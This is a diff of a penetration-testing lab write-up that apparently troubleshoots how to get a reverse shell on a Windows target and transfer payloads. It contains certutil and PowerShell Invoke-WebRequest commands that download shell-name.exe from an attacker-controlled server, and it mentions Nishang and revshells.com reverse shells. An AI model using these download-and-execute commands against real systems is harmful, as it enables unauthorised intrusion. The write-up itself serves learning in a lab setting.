@@ -222,27 +222,35 @@ https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65
 ```
 Its the same as reverse shell rom revshells.com, except String cmd="sh" is String cmd="cmd.exe" and of course change ip and port as normal.
 
-This method of reverse shell is terribly unstable. The other issue is that CMD shell does not support copying by port number so 
+This reverse‑shell method seemed to crash when I tried transitioning to PowerShell—just using that word caused the session to break. From that point, certutil was the best option for transferring a file. However, when using the VPN, the target at IP:8080 was reachable until a password was entered. Because of that, I had to use the attack box directly.
+
+This created a new issue: port 80 was no longer usable, which meant I couldn’t rely on python3 -m http.server 80. The environment did allow port 443, though.
+```
+certutil.exe -urlcache -split -f http://<targetIP>/shell-name.exe shell-name.exe
+or just
+```
+
+.I also tried using copy, but CMD doesn’t support copying via port numbers because it relies on SMB. According to Nmap, SMB wasn’t available on the target, and even if it had been, the copy \\IP\file method still wouldn’t have worked because SMB doesn’t allow specifying ports in UNC paths. It only operates over ports 445 or 139 when those services are running. Since neither port was open, copy was never a viable option.
 ```
 copy //ip/folder/file file
 ```
-wont work no matter what port. Powershell has the invoke-webrequest command, SMB does not support ports, 445 wont work here. Using powershell command from cmd shell wont work either: 
+
+Using the PowerShell command from a CMD shell didn’t work either:
 ```
 powershell -command "Invoke-WebRequest -Uri http://<attackerIP>:8000/shell-name.exe -OutFile shell-name.exe"
 ```
-Here’s the key point:
-- CMD can launch PowerShell
-- PowerShell can run Invoke-WebRequest
-- But Invoke-WebRequest is disabled or restricted on many Windows systems
-This is usually due to:
+In theory this should have worked as long as PowerShell was available and allowed to make outbound web requests, but in this environment it failed. 
+
+I wondered why this would fail here are a few reason it might fail:
 - Execution policy restrictions
+- But Invoke-WebRequest is disabled or restricted on many Windows systems
 - PowerShell 2.0 being used instead of 5+
 - Missing TLS support
 - Network restrictions
 - SmartScreen / Defender blocking the download
 - Corporate policy disabling web requests
 
-So here I am back to nishang for this task.
+## So here I am back to nishang for this task.
 
 reset the reverse shell. 
 - Uploaded new payload with python3 -m http.server.
